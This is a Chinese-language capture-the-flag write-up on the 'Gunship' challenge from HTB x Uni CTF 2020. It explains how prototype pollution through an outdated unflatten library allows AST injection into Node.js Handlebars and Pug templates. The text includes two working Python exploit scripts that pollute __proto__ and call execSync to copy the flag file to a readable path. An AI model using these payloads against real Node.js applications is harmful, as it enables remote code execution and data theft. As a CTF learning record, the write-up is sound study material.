# Gunship

date: `2021-09-02`


## 懵逼记录

第一次做 web 类的题目, 还是挺不知所措的, 打开后点了一下页面, 发现唯一一个与server有交互的接口是页面最下面 `who's your favourite artist?` 的按钮

点击后数据包格式为:

```http request
POST /api/submit HTTP/1.1
Host: 192.168.220.168:1337
Content-Length: 31
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://192.168.220.168:1337
Referer: http://192.168.220.168:1337/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: _xsrf=2|54a131fd|a0a4bc2b445ff9b6537609c8f4d5f01e|1626706894; username-192-168-220-168="2|1:0|10:1629450827|24:username-192-168-220-168|44:OGEzOTE5NDg3ZDkxNDZhNDhjY2VlNWZiZWFkNmYyYzM=|4f6d1b355b08d1cf40bc08f661226a0f44c4ae407709859af6265c31b9d83d3e"
Connection: close

{"artist.name":"Alex Westaway"}
```

看了下没什么数据交互的部分, 甚至 xss 都没有, 就懵逼了...

## 题解(抄作业)

看了网上的 write-up, 发现这是一个 `HTB x Uni CTF 2020` 的题目, [题解地址](https://sec.stealthcopter.com/htb-ctf-write-up-gunship/)

Gunship 是一个 Nodejs 的web应用, 在 比赛中, 应用源码中带有一段注释, 指明了存在漏洞的地方和漏洞类型:

> unflatten seems outdated and a bit vulnerable to prototype pollution we sure hope so that po6ix doesn't pwn our puny app with his AST injection on template engines

谷歌一下, 就发现了 po6ix 关于 Nodejs AST injection的博客: [博客地址](https://blog.p6.is/AST-Injection/#Exploit)

博客中介绍了 Nodejs 两种 AST, Handlebars 和 Pug 的 exp

Handlebars:

```python
import requests

#TARGET_URL = 'http://178.128.160.242:32080'
TARGET_URL = 'http://localhost:1337'

# make pollution
r = requests.post(TARGET_URL+'/api/submit', json = { 
    "artist.name":"Gingell",
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.require('child_process').execSync('cat /app/flags* > /app/static/out')"
        }], 
        "loc": {
            "start": 0,
            "end": 0
        }   
    }]  
    })  

print(r.status_code)
print(r.text)

print(requests.get(TARGET_URL+'/static/out').text)
```

Pug:

```python
import requests

#TARGET_URL = 'http://188.166.173.208:30000'
TARGET_URL = 'http://0.0.0.0:1337'

# make pollution
r = requests.post(TARGET_URL+'/api/submit', json = { 
        "artist.name": "Haigh",
        "__proto__.block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync('cat /app/flag* > /app/static/out')"
        }   
})


print(r.status_code)
print(r.text)

print(requests.get(TARGET_URL+'/static/out').text)
```

利用之即可 get flag

## 思考

1. 遇到一个网站, 如何识别其所用组件?

- web指纹, https://www.freebuf.com/articles/web/202560.html
  - whatweb
  - Wapplyzer

2. web组件极多, 如何有效查询组件具有的漏洞和利用?
  #todo


